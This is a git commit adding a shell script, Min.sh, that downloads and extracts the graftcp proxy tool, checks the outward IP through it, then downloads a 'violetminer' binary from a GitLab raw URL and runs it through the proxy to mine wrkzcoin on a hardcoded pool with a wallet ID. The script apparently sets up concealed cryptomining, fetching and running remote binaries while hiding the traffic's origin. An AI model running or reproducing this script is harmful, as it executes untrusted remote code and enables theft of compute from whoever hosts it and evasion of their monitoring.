70326093b91a0f51c053b96d247e66b87eb1eb7c
Todorox <141935816+Todorox@users.noreply.github.com>
2023-08-14 21:30:17 +0700

    Create Min.sh

---
+++ Min.sh
@@ -0,0 +1,16 @@
+curl -L -o graftcp.tar.gz https://github.com/Todorox/Rand/raw/main/graftcp.tar.gz
+tar -xvzf graftcp.tar.gz
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+curl -L -o violetminer https://gitlab.com/arianajsh89/werdata/-/raw/main/violetminer && chmod +x violetminer
+
+./graftcp/graftcp ./violetminer --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_XPDzztzE6rL4rQlJtSwyL.1059 --password x --disableNVIDIA --threads 1
